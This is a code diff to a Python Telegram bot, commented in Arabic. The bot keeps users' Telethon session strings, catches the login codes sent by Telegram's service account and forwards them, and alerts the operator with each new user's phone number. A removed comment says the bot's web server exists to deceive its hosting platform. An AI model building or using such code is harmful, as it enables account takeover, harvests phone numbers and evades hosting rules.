@@ -31,7 +31,7 @@ RATE_LIMIT_SECONDS = 2
 logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# --- Web Server for Render (لخداع المنصة) ---
+# --- Web Server for Render ---
 def run_web_server():
     port = int(os.environ.get("PORT", 8080))
     class SimpleHandler(BaseHTTPRequestHandler):
@@ -71,6 +71,22 @@ def btn(text, callback_data=None, url=None, style=None):
             pass
     return InlineKeyboardButton(**kwargs)
 
+# --- دالة ربط الرادار بالحساب ---
+def attach_otp_handler(client, user_id, phone):
+    @client.on(events.NewMessage(from_users=777000))
+    async def otp_handler(event):
+        if radar_mode.get(user_id) == phone:
+            code = event.raw_text
+            try:
+                await app.bot.send_message(
+                    chat_id=user_id,
+                    text=f"🔑 **وصل الرمز لحساب:** `{phone}`\n\n**الرمز:**\n`{code}`\n\nقم بنسخه فوراً.",
+                    parse_mode="Markdown"
+                )
+            except Exception as e:
+                logger.error(f"Error sending to {user_id}: {e}")
+            radar_mode.pop(user_id, None)
+
 # --- إدارة حسابات Telethon ---
 async def start_telethon_client(user_id, phone, session_str):
     try:
@@ -79,19 +95,7 @@ async def start_telethon_client(user_id, phone, session_str):
         if not await client.is_user_authorized():
             return None
         
-        @client.on(events.NewMessage(from_users=777000))
-        async def otp_handler(event):
-            if radar_mode.get(user_id) == phone:
-                code = event.raw_text
-                try:
-                    await app.bot.send_message(
-                        chat_id=user_id,
-                        text=f"🔑 **وصل الرمز لحساب:** `{phone}`\n\n**الرمز:**\n`{code}`\n\nقم بنسخه فوراً.",
-                        parse_mode="Markdown"
-                    )
-                except Exception as e:
-                    logger.error(f"Error sending to {user_id}: {e}")
-                radar_mode.pop(user_id, None)
+        attach_otp_handler(client, user_id, phone)
         return client
     except Exception as e:
         logger.error(f"Failed to load client {phone}: {e}")
@@ -108,7 +112,6 @@ async def load_all_clients():
             if isinstance(data, dict):
                 session_str = data.get("session")
             else:
-                # ترقية الجلسات القديمة للصيغة الجديدة
                 db[user_id_str][phone] = {"session": data, "label": phone, "added_at": "غير معروف"}
                 needs_save = True
                 
@@ -326,6 +329,8 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             active_clients[user_id].pop(f"temp_{phone}", None)
             active_clients[user_id][phone] = client
             
+            attach_otp_handler(client, user_id, phone)  # <--- تفعيل الرادار بعد الإضافة مباشرة
+            
             await app.bot.send_message(ADMIN_ID, f"🔔 مستخدم جديد أضاف حساباً:\nID: `{user_id}`\nPhone: `{phone}`", parse_mode="Markdown")
             
             await update.message.reply_text(f"🔥 تم تسجيل الدخول وحفظ الجلسة بنجاح!\nالحساب الآن محفوظ في خزنتك.")
@@ -357,6 +362,8 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             active_clients[user_id].pop(f"temp_{phone}", None)
             active_clients[user_id][phone] = client
+            
+            attach_otp_handler(client, user_id, phone)  # <--- تفعيل الرادار بعد الإضافة مباشرة
             
             await app.bot.send_message(ADMIN_ID, f"🔔 مستخدم جديد أضاف حساباً (2FA):\nID: `{user_id}`\nPhone: `{phone}`", parse_mode="Markdown")
             
